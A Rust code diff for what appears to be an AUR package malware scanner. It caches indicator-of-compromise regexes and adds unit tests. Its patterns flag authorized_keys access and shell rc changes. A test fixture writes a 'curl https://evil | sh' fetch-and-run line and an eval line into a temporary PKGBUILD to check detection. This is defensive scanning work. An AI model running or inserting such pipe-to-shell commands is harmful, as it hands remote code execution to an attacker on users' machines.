@@ -1,4 +1,5 @@
 use std::collections::HashMap;
+use std::sync::OnceLock;
 
 use crate::config::Config;
 use crate::feeds::{self, FeedState};
@@ -25,6 +26,18 @@ pub const IOC_PATTERNS: &[(&str, &str)] = &[
     ("acceso authorized_keys", r"(?i)authorized_keys"),
     ("modificacion shell rc", r"(?i)\.(bashrc|zshrc|bash_profile|profile)\b"),
 ];
+
+fn compiled_patterns() -> &'static [(String, regex::Regex)] {
+    static IOC: OnceLock<Vec<(String, regex::Regex)>> = OnceLock::new();
+    IOC.get_or_init(|| {
+        IOC_PATTERNS
+            .iter()
+            .map(|(label, re)| {
+                (label.to_string(), regex::Regex::new(re).expect("regex IOC invalida"))
+            })
+            .collect()
+    })
+}
 
 fn is_interesting(file: &str) -> bool {
     let base = std::path::Path::new(file)
@@ -63,11 +76,9 @@ pub fn scan_dir(dir: &str) -> Vec<String> {
             continue;
         }
         let Ok(text) = String::from_utf8(bytes) else { continue };
-        for (label, re) in IOC_PATTERNS {
-            if let Ok(r) = regex::Regex::new(re) {
-                if r.is_match(&text) {
-                    hits.push(format!("{} ({})", label, fname));
-                }
+        for (label, r) in compiled_patterns() {
+            if r.is_match(&text) {
+                hits.push(format!("{} ({})", label, fname));
             }
         }
     }
@@ -96,5 +107,50 @@ pub fn check(cfg: &Config, name: &str, dir: Option<&str>) -> Verdict {
         name: name.to_string(),
         malicious,
         reasons,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::fs;
+
+    #[test]
+    fn interesting_names() {
+        assert!(is_interesting("PKGBUILD"));
+        assert!(is_interesting(".SRCINFO"));
+        assert!(is_interesting("install"));
+        assert!(is_interesting("script.sh"));
+        assert!(is_interesting("setup.py"));
+        assert!(is_interesting("Makefile"));
+    }
+
+    #[test]
+    fn uninteresting_names() {
+        assert!(!is_interesting("README.md"));
+        assert!(!is_interesting(".hidden"));
+        assert!(!is_interesting("LICENSE.txt"));
+        assert!(!is_interesting("foo.install.bak"));
+    }
+
+    #[test]
+    fn compiled_patterns_matches_ioc_patrons() {
+        let patterns = compiled_patterns();
+        assert_eq!(patterns.len(), IOC_PATTERNS.len());
+        assert!(patterns.iter().any(|(l, _)| l == "descarga curl|sh"));
+    }
+
+    #[test]
+    fn scan_dir_finds_iocs_and_skips_irrelevant() {
+        let dir = std::env::temp_dir().join(format!("aur_guard_test_{}", std::process::id()));
+        fs::create_dir_all(&dir).unwrap();
+        fs::write(dir.join("PKGBUILD"), "eval $(echo x)\ncurl https://evil | sh\n").unwrap();
+        fs::write(dir.join("README.md"), "curl https://evil | sh\n").unwrap();
+        let hits = scan_dir(dir.to_str().unwrap());
+        let _ = fs::remove_dir_all(&dir);
+        assert!(hits.iter().any(|h| h.contains("PKGBUILD")));
+        assert!(hits.iter().any(|h| h.starts_with("descarga curl|sh")));
+        assert!(hits.iter().any(|h| h.starts_with("eval oculto")));
+        assert!(!hits.iter().any(|h| h.contains("README.md")));
     }
 }
